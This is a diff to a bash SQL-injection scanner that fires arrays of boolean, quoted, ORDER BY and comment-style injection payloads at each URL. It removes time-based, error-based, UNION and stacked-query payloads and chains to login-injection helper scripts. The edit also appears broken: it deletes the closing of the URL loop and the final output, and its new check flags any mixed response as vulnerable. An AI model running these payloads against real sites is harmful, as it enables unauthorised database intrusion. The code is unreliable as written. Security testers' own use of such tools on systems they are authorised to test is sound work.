@@ -289,104 +289,143 @@ while IFS= read -r url; do
   base_code=$(curl_cmd "$url")
   [[ "$base_code" == "000" ]] && continue
 
-  # ---- Stage 2: boolean injection
-  trueCheck=$(curl_cmd "${url}/1%20AND%201=1--%20-")
-  falseCheck=$(curl_cmd "${url}/1%20AND%202=1--%20-")
+  # ---- Stage 2: boolean injection (multiple payloads)
+vulnerable=false
 
-  if [[ "$trueCheck" == "200" ]] && [[ "$falseCheck" != "200" ]]; then
-    echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-    echo -e "Payload: ${YELLOW}${url}/1 AND 2=1-- -${NC}"
-    echo -e "Reason: ${BLUE}Boolean condition difference${NC}"
-    vulnerable=true
-
-#echo -e "Runnig Comparison check on ${GREEN}$url${NC}"
-if [[ -n "$header" ]]; then
-"$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url"  -H "$header" || true
-else
-"$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
-fi
-
-#echo -e "Running Login SQL Injection Test ${GREEN}$url${NC}"
-"$SCRIPT_DIR/sqlogin.sh" "$url" || true
-fi
-
-  # ---- Stage 3: quoted injection (only if not vulnerable)
-  if [[ "$vulnerable" == false ]] \
-     && [[ "$trueCheck" -gt 199 ]] \
-     && [[ "$falseCheck" -gt 300 ]]; then
-
-    trueCheck2=$(curl_cmd "${url}/'1%20AND%201=1--%20-")
-    falseCheck2=$(curl_cmd "${url}/'1%20AND%202=1--%20-")
-
-    if [[ "$trueCheck2" == "200" ]] && [[ "$falseCheck2" != "200" ]]; then
-      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-      echo -e "Payload: ${YELLOW}${url}/'1 AND 2=1-- -${NC}"
-      echo -e "Reason: ${BLUE}Quoted boolean injection${NC}"
-      vulnerable=true
+# Test a single payload for boolean injection
+test_payload() {
+  local url="$1"
+  local payload="$2"
+  local description="$3"
+  
+  response_code=$(curl_cmd "${url}/${payload}")
+  
+  # Check if response is 200 (true) or not 200 (false)
+  if [[ "$response_code" == "200" ]]; then
+    if [[ "$verbose" == true ]]; then
+      echo -e "${BLUE}[*] Payload '$payload' returned TRUE (200)${NC}" 1>&2
     fi
+    echo "true"
+  else
+    if [[ "$verbose" == true ]]; then
+      echo -e "${BLUE}[*] Payload '$payload' returned FALSE ($response_code)${NC}" 1>&2
+    fi
+    echo "false"
   fi
+}
 
-# ---- Stage 4: Advanced SQLi (only if still not vulnerable)
+# Array of payloads to test
+declare -a payloads=(
+  # Standard boolean injections
+  "1%20AND%201=1--%20-"
+  "1%20AND%202=1--%20-"
+  "1%20OR%201=1--%20-"
+  "1%20OR%201=2--%20-"
+  
+  # Quoted boolean injections
+  "'1%20AND%201=1--%20-"
+  "'1%20AND%202=1--%20-"
+  "'1%20OR%201=1--%20-"
+  "'1%20OR%201=2--%20-"
+  
+  # Double quoted boolean injections
+  "\"%20AND%201=1--%20-"
+  "\"%20AND%202=1--%20-"
+  "\"%20OR%201=1--%20-"
+  "\"%20OR%201=2--%20-"
+  
+  # Parentheses variations
+  "(1)%20AND%201=1--%20-"
+  "(1)%20AND%202=1--%20-"
+  "1)%20AND%201=1--%20-"
+  "1)%20AND%202=1--%20-"
+  
+  # ORDER BY injections
+  "%20order%20by%201--%20-"
+  "%20order%20by%2010--%20-"
+  "'%20order%20by%201--%20-"
+  "'%20order%20by%2010--%20-"
+  "\"%20order%20by%201--%20-"
+  "\"%20order%20by%2010--%20-"
+  
+  # Different comment styles
+  "1%20AND%201=1%23"
+  "1%20AND%202=1%23"
+  "1%20AND%201=1/*comment*/--"
+  "1%20AND%202=1/*comment*/--"
+)
+
+# Store results for comparison
+declare -A payload_results
+declare -a true_payloads=()
+declare -a false_payloads=()
+
+# Test all payloads
+if [[ "$verbose" == true ]]; then
+  echo -e "${BLUE}[*] Testing boolean injection payloads...${NC}" 1>&2
+fi
+
+for payload in "${payloads[@]}"; do
+  result=$(test_payload "$url" "$payload" "Boolean test")
+  payload_results["$payload"]="$result"
+  
+  if [[ "$result" == "true" ]]; then
+    true_payloads+=("$payload")
+  else
+    false_payloads+=("$payload")
+  fi
+done
+
+# Check if we have both true and false responses
+if [[ ${#true_payloads[@]} -gt 0 ]] && [[ ${#false_payloads[@]} -gt 0 ]]; then
+  echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+  echo -e "Reason: ${BLUE}Boolean injection detected - different responses for different payloads${NC}"
+  echo -e "${BLUE}  True responses (200):${NC}"
+  for p in "${true_payloads[@]:0:3}"; do  # Show first 3 true payloads
+    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
+  done
+  echo -e "${BLUE}  False responses (not 200):${NC}"
+  for p in "${false_payloads[@]:0:3}"; do  # Show first 3 false payloads
+    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
+  done
+  
+  vulnerable=true
+  
+  # Run additional tests
+  if [[ -n "$header" ]]; then
+    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
+  else
+    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
+  fi
+  
+  "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+fi
+
+# Additional check: ORDER BY incremental testing
 if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
-  echo "Performing Intensive Scan..."
-  baseline_time=$(curl_time "$url")
-
-  payloads=(
-    # ---- Time-based
-    "1%20AND%20SLEEP(5)--%20-"
-    "1'%20AND%20SLEEP(5)--%20-"
-    '1"%20AND%20SLEEP(5)--%20-'
-
-    # ---- Error-based
-    "1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
-    "1'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
-
-    # ---- UNION-based
-    "1%20UNION%20SELECT%20NULL--%20-"
-    "1'%20UNION%20SELECT%20NULL--%20-"
-
-    # ---- Stacked queries
-    "1;SELECT%20SLEEP(5)--%20-"
-  )
-
-  for payload in "${payloads[@]}"; do
-    test_url="${url}/${payload}"
-
-    # ---- Time-based detection
-    if [[ "$payload" == *"SLEEP"* ]]; then
-      start=$(date +%s)
-      curl_time "$test_url" >/dev/null
-      end=$(date +%s)
-      diff=$((end - start))
-
-      if [[ "$diff" -ge 5 ]]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${test_url}${NC}"
-        echo -e "Reason: ${BLUE}Time-based SQL injection (delay ${diff}s)${NC}"
-        vulnerable=true
-        break
+  if [[ "$verbose" == true ]]; then
+    echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
+  fi
+  
+  # Test ORDER BY with increasing column numbers
+  for i in {1..20}; do
+    order_payload="%20order%20by%20${i}--%20-"
+    response_code=$(curl_cmd "${url}/${order_payload}")
+    
+    if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]]; then
+      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+      echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
+      echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
+      vulnerable=true
+      
+      # Run additional tests
+      if [[ -n "$header" ]]; then
+        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
+      else
+        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
       fi
-    else
-      # ---- Error / UNION / stacked detection.
-      code=$(curl_cmd "$test_url")
-
-      if [[ "$code" != "$base_code" ]] && [[ "$code" != "404" ]]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${test_url}${NC}"
-        echo -e "Reason: ${BLUE}Response anomaly (status $base_code → $code)${NC}"
-        vulnerable=true
-        break
-      fi
+      
+      "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+      break
     fi
   done
-fi
-
-
-
-
-  # ---- Final safe output
-  if [[ "$vulnerable" == false ]]; then
-    echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
-  fi
-
-done <<< "$urls"
